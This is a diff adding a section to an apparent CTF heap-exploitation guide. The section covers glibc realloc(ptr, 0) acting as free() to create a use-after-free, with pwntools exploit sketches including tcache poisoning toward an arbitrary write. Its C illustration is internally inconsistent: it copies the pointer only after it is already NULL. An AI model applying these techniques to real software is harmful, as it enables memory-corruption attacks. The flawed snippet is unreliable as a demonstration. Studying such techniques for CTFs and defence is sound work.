@@ -22,6 +22,7 @@
 - [glibc 2.24+ _IO_FILE Vtable Validation Bypass (HITCON 2017)](#glibc-224-_io_file-vtable-validation-bypass-hitcon-2017)
 - [Unsorted Bin Attack on stdin _IO_buf_end (HITCON 2017)](#unsorted-bin-attack-on-stdin-_io_buf_end-hitcon-2017)
 - [Unsorted Bin Corruption via mp_ Structure (HITCON 2017)](#unsorted-bin-corruption-via-mp_-structure-hitcon-2017)
+- [realloc(ptr, 0) as free() for UAF (AceBear 2018)](#reallocptr-0-as-free-for-uaf-acebear-2018)
 
 ---
 
@@ -726,3 +727,63 @@ write_to_result(one_gadget)  # overwrites __malloc_hook
 **Key insight:** glibc's `mp_` global structure passes unsorted bin validation naturally — its `trim_threshold` field serves as a convincing fake chunk size. A fake free chunk planted via unsorted bin corruption there enables allocation directly into glibc metadata, bypassing the need for any heap-side fake chunk construction.
 
 **References:** HITCON CTF 2017
+
+---
+
+## realloc(ptr, 0) as free() for UAF (AceBear 2018)
+
+**Pattern:** `realloc(ptr, 0)` behaves like `free(ptr)` in many glibc versions, returning the chunk to the freelist while the application may retain the old pointer — creating a use-after-free.
+
+**How it works:**
+```c
+// C standard says realloc(ptr, 0) is implementation-defined
+// In glibc: realloc(ptr, 0) calls free(ptr) and returns NULL
+// If the application doesn't check the return value:
+void *ptr = malloc(0x80);
+ptr = realloc(ptr, 0);    // ptr is now NULL, chunk is freed
+// But if the app stores the old pointer separately:
+void *saved = ptr;
+ptr = realloc(ptr, 0);    // freed, but saved still points to freed chunk
+// saved is now a dangling pointer → UAF
+```
+
+**Exploitation:**
+```python
+from pwn import *
+
+# Step 1: Allocate a chunk
+add(0, 0x80, b"AAAA")  # chunk at index 0
+
+# Step 2: Trigger realloc with size 0
+# Internally calls realloc(ptr, 0) which frees the chunk
+edit(0, size=0)  # realloc(ptr, 0) = free(ptr)
+# ptr is now freed but the application still holds the pointer at index 0
+
+# Step 3: Allocate new chunk that reuses the freed memory
+add(1, 0x80, b"BBBB")  # gets the same address as freed chunk
+
+# Step 4: Read through original index 0 → reads attacker-controlled data from index 1
+# Or: write through index 0 to corrupt index 1's chunk
+view(0)  # UAF read — sees "BBBB" written by index 1
+```
+
+**Tcache variant (glibc 2.26+):**
+```python
+# realloc(ptr, 0) puts the chunk in the tcache bin
+# Subsequent malloc of the same size returns the same chunk
+# Double reference enables tcache poisoning:
+
+add(0, 0x80, b"AAAA")
+edit(0, size=0)           # free via realloc → tcache[0x90]
+add(1, 0x80, p64(target)) # reuse freed chunk, write fake fd pointer
+# If index 0 still references the chunk:
+edit(0, size=0)           # double-free via realloc → tcache poisoning
+add(2, 0x80, b"CCCC")    # returns freed chunk
+add(3, 0x80, payload)    # returns target address → arbitrary write
+```
+
+**Key insight:** `realloc(ptr, 0)` is implementation-defined. In glibc, it frees the block and returns NULL. If the application doesn't check the return value or still uses the old pointer, this creates a UAF. Look for `realloc` calls where the size parameter is user-controlled — setting it to 0 triggers the free behavior without going through the application's normal delete/free path, potentially bypassing reference counting or pointer nullification in the delete handler.
+
+**When to recognize:** Challenge uses `realloc` for resize operations and the size is user-controlled. The "edit" or "resize" functionality internally calls `realloc` — check if size=0 is handled specially or just passed through. Also check if the return value of `realloc` is used to update the stored pointer (if not, the old pointer becomes dangling).
+
+**References:** AceBear 2018
